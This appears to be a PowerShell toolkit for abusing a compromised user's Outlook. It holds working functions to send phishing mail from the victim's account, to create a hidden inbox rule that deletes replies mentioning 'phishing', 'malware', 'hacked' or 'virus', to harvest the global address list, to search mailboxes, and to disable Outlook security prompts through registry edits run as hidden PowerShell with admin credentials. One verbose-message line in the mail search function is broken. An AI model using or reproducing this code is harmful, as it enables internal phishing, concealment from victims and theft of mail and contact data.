



function Invoke-SendMail {
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False, Position = 0, ValueFromPipeline = $True)]
        [string[]]$Targets,

        [Parameter(Mandatory = $False, Position = 1)]
        [string]$TargetList,

        [Parameter(Mandatory = $False, Position = 2)]
        [string]$URL,

        [Parameter(Mandatory = $False, Position = 3)]
        [string]$Attachment,

        [Parameter(Mandatory = $False, Position = 4)]
        [String]$Template,

        [Parameter(Mandatory = $False, Position = 5)]
        [string]$Subject,

        [Parameter(Mandatory = $False, Position = 6)]
        [String]$Body

    )



    
    if($TargetList){
        if(!(Test-Path $TargetList)){
            Throw "Not a valid file path for E-Mail TargetList"
        }
        $TargetEmails = Get-Content $TargetList
    }
    elseif($Targets){
        $TargetEmails = $Targets
    }
    
    
    if($Template){
        if(!(Test-Path $Template)){
            Throw "Not a valid file path for E-mail template"
        }
        $EmailBody = Get-Content -Path $Template
        $EmailSubject = $Subject
    }
    elseif($Subject -and $Body){
        $EmailSubject = $Subject 
        $EmailBody = $Body 
    }
    else {
        Throw "No email Subject and/or Body specified"
    }

    
    if($URL){
        $EmailBody = $EmailBody.Replace("URL",$URL)
    }

    
    $appdatapath = $env:appdata
    $sigpath = $appdatapath + "\Microsoft\Signatures\*.htm"

    if(Test-Path $sigpath){
        $Signature = Get-Content -Path $sigpath
    } 
     

    
    
    Invoke-Rule -Subject $Subject -RuleName "RaiderIn"

    
    ForEach($Target in $TargetEmails){

        $Outlook = Get-OutlookInstance
        $Email = $Outlook.CreateItem(0)
        
        if($Attachment){
            $($Email.Attachment).Add($Attachment)
        }
        $Email.HTMLBody = "$EmailBody"
        $Email.Subject = $EmailSubject
        $Email.To = $Target

        
        if($Signature){
            $Email.HTMLBody += "`n`n" + "$Signature"
        }
        $Email.Send()
        Write-Verbose "Sent Email to $Target"

        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
    } 

    
   
}


function Invoke-Rule {

    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False, Position = 0)]
        [string]$Subject,

        [Parameter(Mandatory = $False, Position = 1)]
        [string]$RuleName,

        [Parameter(Mandatory = $False, Position = 2)]
        [System.__ComObject]$Outlook,

        [Parameter(Mandatory = $False)]
        [switch]$Disable
    )

    $flags = @()
    $flags = $Subject.Split(" ")
    $flags += "hacked"
    $flags += "malware"
    $flags += "phishing"
    $flags += "virus"

    If(!($Outlook)){

        $Outlook = Get-OutlookInstance
        $MAPI = $Outlook.GetNamespace('MAPI')

    }

    if($Disable){
        $rule = ($($Outlook.session).DefaultStore).GetRules() | Where-Object {$_.Name -eq $RuleName}
        $rule.enabled = $False 
    }
    else{

        
        $rule = ($($Outlook.session).DefaultStore).GetRules() | Where-Object {(!(Compare-Object $($_.Conditions.Subject).Text $flags))}
        if(!($rule)){
            
            Add-Type -AssemblyName Microsoft.Office.Interop.Outlook | Out-Null
            
            $inbox = Get-OutlookFolder -Name "Inbox"
            $DeletedFolder = Get-OutlookFolder -Name "DeletedItems"
            
            $rules = $MAPI.DefaultStore.GetRules()
            $rule = $rules.create($RuleName, [Microsoft.Office.Interop.Outlook.OlRuleType]::OlRuleReceive)

            $SubText = $rule.Conditions.Subject
            $SubText.Enabled = $true
            
            $SubText.Text = $flags
            $action = $rule.Actions.MoveToFolder
            $action.enabled = $true
            [Microsoft.Office.Interop.Outlook._MoveOrCopyRuleAction].InvokeMember(
                "Folder",
                [System.Reflection.BindingFlags]::SetProperty,
                $null,
                $action,
                $DeletedFolder)
            
            try {
                $rules.Save()
                Write-Verbose "Saved Outlook Rule with name: $Rulename"
            } 
            catch {
                Write-Warning "Unable to save inbound rule with name: $RuleName"
            }
        }
        
    }


    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null 
    

}

function Get-OSVersion {

    

    
    Write-Verbose "Detecting OS..."
    $OS = [environment]::OSVersion.Version


    if($OS.Major -eq 10){
        $OSVersion = "Windows 10"
    }

    
    if($OS.Major -eq 6){
        switch ($OS.Minor){
            3 {$OSVersion = "Windows 8.1/Server 2012 R2"}
            2 {$OSVersion = "Windows 8/Server 2012"}
            1 {$OSVersion = "Windows 7/Server 2008 R2"}
            0 {$OSVersion = "Windows Vista/Server 2008"}
        }
    }
    if($OS.Major -eq 5){
        switch ($OS.Minor){
            2 {$OSVersion = "Windows XP/Server 2003 R2"}
            1 {$OSVersion = "Windows XP"}
            0 {$OSVersion = "Windows 2000"}

        }
    }

    Write-Verbose "Checking the bitness of the OS"
    if((Get-WmiObject -class win32_operatingsystem).OSArchitecture -eq "64-bit"){
        $OSArch = 64
    }
    else{
        $OSArch = 32
    }
    $OSVersion
    $OSArch 
}

function Select-EmailItem {
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)]
        [System.__ComObject]$FolderObj,

        [Parameter(Mandatory = $True)]
        [int]$Num
    )

    $EmailItem = $FolderObj.Items | Select-Object -Index $Num 

    $EmailItem | Select-Object To,SenderName,SenderEmailAddress,Subject,Body,SentOn,ReceivedTime
    
}


function View-Email {
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [string]$FolderName,

        [Parameter(Mandatory = $False, Position = 1)]
        [int]$Index = 0
    )


    $OF = Get-OutlookFolder -Name $FolderName 
    Select-EmailItem -FolderObj $OF -Num $Index
}

function Get-OutlookFolder {
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [String]$Name
    )

    $OlDefaultFolders = @{
        "olFolderCalendar" = 9
        "olFolderConflicts" = 19
        "olFolderContacts" = 10
        "olFolderDeletedItems" = 3
        "olFolderDrafts" = 16
        "olFolderInbox" = 6
        "olFolderJournal" = 11
        "olFolderJunk" = 23
        "olFolderLocalFailures" = 21
        "olFolderManageEmail" = 29
        "olFolderNotes" = 12
        "olFolderOutbox" = 4
        "olFolderSentMail" = 5
        "olFolderServerFailures" = 22
        "olFolderSuggestedContacts" = 30
        "olFolderSyncIssues" = 20
        "olFolderTasks" = 13
        "olFolderToDo" = 28
        "olPublicFoldersAllPublicFolders" = 18
        "olFolderRssFeeds" = 25
    }



    $DefaultFolderName = "olFolder$Name"

    $Value = $OlDefaultFolders.Item($DefaultFolderName)

    $Outlook = Get-OutlookInstance

    $MAPI = $Outlook.GetNamespace('MAPI')

    $FolderObj =  $MAPI.GetDefaultFolder($Value)

    Write-Verbose "Obtained Folder Object"

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null

    $FolderObj

}

function Get-EmailItems {
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0, ValueFromPipeline = $True)]
        [System.__ComObject]$Folder,

        [Parameter(Mandatory = $False, Position = 1)]
        [int]$MaxEmails,

        [Parameter(Mandatory = $False)]
        [switch]$FullObject
    )
    
    
    if($MaxEmails){
        Write-Verbose "Selecting the first $MaxEmails emails"
        $Items = $Folder.Items | Select-Object -First $MaxEmails
    }
    else{
        Write-Verbose "Selecting all emails"
        $Items = $Folder.Items
    }

    if(!($FullObject)){
        $Emails = @()
        Write-Verbose "Creating custom Email item objects..."
        $Items | ForEach {

            $Email = New-Object PSObject -Property @{
                To = $_.To
                FromName = $_.SenderName 
                FromAddress = $_.SenderEmailAddress
                Subject = $_.Subject
                Body = $_.Body
                TimeSent = $_.SentOn
                TimeReceived = $_.ReceivedTime

            }

            $Emails += $Email
            $Emails = $Emails | Sort-Object -Property TimeSent -Descending

        }
    }
    else{
        Write-Verbose "Obtained full Email Item objects...."
        $Emails = $Items | Sort-Object -Property SentOn -Descending
    }
    

    $Emails 


}

function Invoke-MailSearch {

    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]$DefaultFolder,

        [Parameter(Mandatory = $True)]
        [string[]]$Keywords,

        [Parameter(Mandatory = $False)]
        [int]$MaxResults,

        [Parameter(Mandatory = $True)]
        [int]$MaxThreads = 15,

        [Parameter(Mandatory = $False)]
        [int]$MaxSearch,

        [Parameter(Mandatory = $False)]
        [string]$File
    )

    
    $ResultsList = @()

  
    $SearchEmailBlock = {

        param($Regex, $MailItem)
        $Subject = $MailItem.Subject
        $Body = $MailItem.Body 
        
        if(($($Regex.Match($Subject)).Success) -or ($($Regex.Match($Body)).Success)){
            $MailItem
        }
    }


    $OF = Get-OutlookFolder -Name $DefaultFolder

    if($MaxSearch){
        $Emails = Get-EmailItems -Folder $OF -FullObject -MaxEmails $MaxSearch
    }
    else {
        $Emails = Get-EmailItems -Folder $OF -FullObject   
    }

    
    if($Keywords.Count -gt 1){
        $count = $Keywords.Count - 2
        for($i = 0; $i -lt $count; $i++){
            $Keywords[$i] += "|"
        }

        [string]$Keywords = $Keywords -join ''
        $Keywords = "\b($Keywords)\b"
        
    }
    else {
        $Keywords =  "\b($Keywords)\b"
    }

    $Regex = [regex]$Keywords
        

    Write-Verbose "[*] Searching through $($Emails.count) emails....."


    
    
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

    
    $MyVars = Get-Variable -Scope 1

    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumfunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

    
    ForEach($Var in $MyVars){
        if($VorbiddenVars -notcontains $Var.Name){
            $sessionState.Variables.Add((New-Object -Typename System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }

    
    Write-Verbose "Creating RunSpace Pool"
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()
    $ps = @()
    $wait = @()

    $counter = 0
    $MsgCount = 1

    ForEach($Msg in $Emails){

        Write-Verbose "Searching Email 

        while ($($pool.GetAvailableRunSpaces()) -le 0){

            Start-Sleep -Milliseconds 500

        }

        $ps += [powershell]::create()

        $ps[$counter].runspacepool = $pool

        [void]$ps[$counter].AddScript($SearchEmailBlock).AddParameter('Regex', $Regex).AddParameter('MailItem', $Msg)

        $jobs += $ps[$counter].BeginInvoke();

        $wait += $jobs[$counter].AsyncWaitHandle

        $counter = $counter + 1
        $MsgCount = $MsgCount + 1

    }

    $waitTimeout = Get-Date 

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
        Start-Sleep -Milliseconds 500
    }

    for ($x = 0; $x -lt $counter; $x++){

        try {
            
            $result = $ps[$x].EndInvoke($jobs[$x])
            if($result){
                $ResultsList += $result 
            }

        }
        catch {
            Write-Warning "error: $_"
        }

        finally {

            $ps[$x].Dispose()
        }
    }

    $pool.Dispose()

    

    If($MaxResults){
        $ResultsList = $ResultsList | Select-Object -First $MaxResults
    }

    If($File){

        $ResultsList | Select-Object SenderName,SenderEmailAddress,ReceivedTime,To,Subject,Body | Out-File $File 
        
    }
    else {
        $ResultsList | Select-Object SenderName,SenderEmailAddress,ReceivedTime,To,Subject,Body
        
    }
    
}

function Get-SubFolders {
    


    [CmdletBinding()]
    param(
        [parameter(Mandatory = $False, Position = 0)]
        [string]$DefaultFolder,

        [parameter(Mandatory = $False)]
        [switch]$FullObject
    )

    $SubFolders = (Get-OutlookFolder -Name $DefaultFolder).Folders 

    If(!($SubFolders)){
        Throw "No subfolders were found for folder: $($Folder.Name)"
    }

    if(!($FullObject)){
        $SubFolders = $SubFolders | ForEach {$_.Name}
    }
    
    $SubFolders 
    
}

function Get-GlobalAddressList {
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)]
        [System.__ComObject]$MAPI
    )

    if(!($MAPI)){

        $Outlook = Get-OutlookInstance
        $MAPI = $Outlook.GetNamespace('MAPI')
    }

    $GAL = $MAPI.GetGlobalAddressList()

    $GAL = $GAL.AddressEntries
    
    $GAL 
}

function Invoke-SearchGAL {

    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, ParameterSetName = "Name", Position = 0)]
        [string]$FullName,

        [Parameter(Mandatory = $True, ParameterSetName = "JobTitle", Position = 1)]
        [string]$JobTitle,

        [Parameter(Mandatory = $True, ParameterSetName = "Email", Position = 2)]
        [string]$Email,

        [Parameter(Mandatory = $True, ParameterSetName = "Department", Position = 3)]
        [string]$Dept,

        [Parameter(Mandatory = $False, Position = 4)]
        [int]$MaxThreads = 15
    )


    $Outlook = Get-OutlookInstance

    $MAPI = $Outlook.GetNamespace("MAPI")

    $GAL = Get-GlobalAddressList -MAPI $MAPI

    $UserList = @()

    ForEach($Entry in $GAL){
        $UserList += $Entry.GetExchangeUser()
    }

    $GAL = $UserList
    
    
    
    $SearchScript = {
        param($Regex,$Type,$User)

        if($Regex.Match($($User.$Type)).Success){
            $User
        }
    }


    if($PSCmdlet.ParameterSetName -eq "Name"){
        $Type = "Name"
        $Term = $FullName
    }
    elseif($PSCmdlet.ParameterSetName -eq "JobTitle"){
        $Type = "JobTitle"
        $Term = $JobTitle
    }
    elseif($PSCmdlet.ParameterSetName -eq "Email"){
        $Type = "PrimarySMTPAddress"
        $Term = $Email
    }
    else {
        $Type = "Department"
        $Term = $Dept
    }

    $Regex = [regex]"\b($Term)\b"
    
    
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

    
    $MyVars = Get-Variable -Scope 1

    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumfunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

    
    ForEach($Var in $MyVars){
        if($VorbiddenVars -notcontains $Var.Name){
            $sessionState.Variables.Add((New-Object -Typename System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }

    
    Write-Verbose "Creating RunSpace Pool"
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()
    $ps = @()
    $wait = @()

    $counter = 0
    $AddressCount = 1

    Write-Verbose "The SearchString is $Term"

    ForEach($User in $GAL){

        Write-Verbose "Searching the through ($AddressCount/$($GAL.Count) address entries...."

        while ($($pool.GetAvailableRunSpaces()) -le 0){

            Start-Sleep -Milliseconds 500

        }

        $ps += [powershell]::create()

        $ps[$counter].runspacepool = $pool
        
        [void]$ps[$counter].AddScript($SearchScript).AddParameter('Regex', $Regex).AddParameter('Type',$Type).AddParameter('User', $User)

        $jobs += $ps[$counter].BeginInvoke();

        $wait += $jobs[$counter].AsyncWaitHandle

        $counter = $counter + 1
        $AddressCount = $AddressCount + 1

    }

    $waitTimeout = Get-Date 

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
        Start-Sleep -Milliseconds 500
    }

    for ($x = 0; $x -lt $counter; $x++){

        try {
            
            $result = $ps[$x].EndInvoke($jobs[$x])
            if($result){
                $ResultsList += $result 
            }

        }
        catch {
            Write-Warning "error: $_"
        }

        finally {

            $ps[$x].Dispose()
        }
    }

    $pool.Dispose()

    $ResultsList 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null


}

function Get-SMTPAddress {
    

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $False, Position = 0, ValueFromPipeline = $True)]
        [string[]]$FullNames
    )

    $Outlook = Get-OutlookInstance
    $MAPI = $Outlook.GetNamespace('MAPI')
    
    $GAL = Get-GlobalAddressList -MAPI $MAPI 

    

    $PrimarySMTPAddresses = @() 
    If($FullNames){
        ForEach($Name in $FullNames){
            try{
                $regex = [regex]"\b($Name)\b"
                $User = $GAL | Where-Object {$_.Name -Match $regex}
            }
            catch {
                Write-Warning "Unable to obtain exchange user object with the name: $Name"
            }
            $PrimarySMTPAddresses += $($User.GetExchangeuser()).PrimarySMTPAddress
        }
    }
    else {
        try {
            $($($($Outlook.Session).CurrentUser).AddressEntry).GetExchangeUser().PrimarySMTPAddress
        }
        catch {
            Throw "Unable to obtain PrimarySMTPAddress for the current user"
        }
    }

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null

    $PrimarySMTPAddresses

}

function Disable-SecuritySettings {

    
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)]
        [string]$AdminUser,

        [Parameter(Mandatory = $False)]
        [string]$AdminPassword,

        [parameter(Mandatory = $True)]
        [string]$Version
    )

    $count = 0

    
    $AV = Get-WmiObject -namespace root\SecurityCenter2 -class Antivirusproduct
    if($AV){
        $AVstate = $AV.productState
        $statuscode = '{0:X6}' -f $AVstate
        $wscupdated = $statuscode[4,5] -join '' -as [byte]
        if($wscupdated -eq  (00 -as [byte]))
        {
            Write-Verbose "AV is up to date"
            $AVUpdated = $True
        }
        elseif($wscupdated -eq (10 -as [byte])){
            Write-Verbose "AV is not up to date"
            $AVUpdated = $False
        }
        else{
            Write-Verbose "Unable to determine AV status"
            $AVUpdated = $False 
        }
    }
    else{
        Write-Verbose "AV not installed"
        $AVUpdated = $False
    }
    

    $LMSecurityKey = "HKLM:\SOFTWARE\Microsoft\Office\$Version\outlook\Security"
        
    $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"

    $ObjectModelGuard = "ObjectModelGuard"
    $PromptOOMSend = "PromptOOMSend"
    $AdminSecurityMode = "AdminSecurityMode" 

    $cmd = " "

    if(!(Test-Path $LMSecurityKey)){
        
        $cmd = "New-Item $LMSecurityKey -Force; "
        $cmd += "New-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -PropertyType DWORD -Force; "
       

    }
    else{

        $currentValue = (Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard -ErrorAction SilentlyContinue).ObjectModelGuard 
        if($currentValue -and ($currentValue -ne 2)){
            
            $cmd = "Set-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -Force; "
        }
        elseif(!($currentValue)) {
            $cmd = "New-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -PropertyType DWORD -Force; "
        }
    
                
    }
    if(!(Test-Path $CUSecurityKey)){

        $cmd += "New-Item $CUSecurityKey -Force; "
        $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force; " 
        $cmd += "New-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -PropertyType DWORD -Force; "
      
    }
    else{
        $currentValue = (Get-ItemProperty $CUSecurityKey -Name PromptOOMSend -ErrorAction SilentlyContinue).PromptOOMSend
        if($currentValue -and ($currentValue -ne 2)){
            
            $cmd += "Set-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -Force; "
            
        }
        elseif(!($currentValue)) {
             $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force; "
        }
        
        $currentValue = (Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode -ErrorAction SilentlyContinue).AdminSecurityMode 
        if($currentValue -and ($currentValue -ne 3)){
            
            $cmd += "Set-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -Force"
            
        }
        elseif(!($currentValue)) {
            $cmd += "New-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -PropertyType DWORD -Force"
        }
                  
    }

    if($AdminUser -and $AdminPassword){

        
        $pw = ConvertTo-SecureString $AdminPassword -asplaintext -Force
        $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $AdminUser,$pw
        $WD = 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\'
        $Arg = " -WindowStyle hidden -Command $cmd"
        Start-Process "powershell.exe" -WorkingDirectory $WD -Credential $creds -ArgumentList $Arg
        $count += 1
        

    }
    else{

        
        if($cmd){
            try {
                Invoke-Expression $cmd
            }
            catch {
                Throw "Unable to change registry settings to disable security prompt"
            }
        }
        $count += 1
        
    }
    

    if($count -eq 1){
        Write-Verbose "Success"
    }
    elseif($count -eq 0){
        Write-Verbose "Disable-SecuritySettings Failed"
    }

}


function Reset-SecuritySettings {
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)]
        [string]$AdminUser,

        [Parameter(Mandatory = $False)]
        [string]$AdminPass,

        [Parameter(Mandatory = $True)]
        [string]$Version
    )


    $LMSecurityKey = "HKLM:\SOFTWARE\Microsoft\Office\$Version\Outlook\Security"

    $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"

        
        
    
    if(Test-Path $LMSecurityKey){
        
        $cmd = "Remove-ItemProperty -Path $LMSecurityKey -Name ObjectModelGuard -Force;"
    }

    if(Test-Path $CUSecurityKey){

        $cmd += "Remove-ItemProperty -Path $CUSecurityKey -Name PromptOOMSend -Force;" 
        $cmd += "Remove-ItemProperty -Path $CUSecurityKey -Name AdminSecurityMode -Force"

    }

    if($AdminUser -and $AdminPass){

        $pw = ConvertTo-SecureString $AdminPass -asplaintext -Force
        $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $AdminUser,$pw
        $WD = 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\'
        $Arg = " -WindowStyle hidden -Command $cmd"
        Start-Process powershell.exe -WorkingDirectory $WD -Credential $creds -ArgumentList $Arg 
    }
    else {
        try {
            Invoke-Expression $cmd
        }
        catch {
            Throw "Unable to reset registry keys"
        }
    }

}


function Get-OutlookInstance {
    
    try {
        $Outlook = New-Object -ComObject "Outlook.Application"
    }
    catch {
        Throw "Unable to open Outlook ComObject"
    }
    

    $Outlook


}

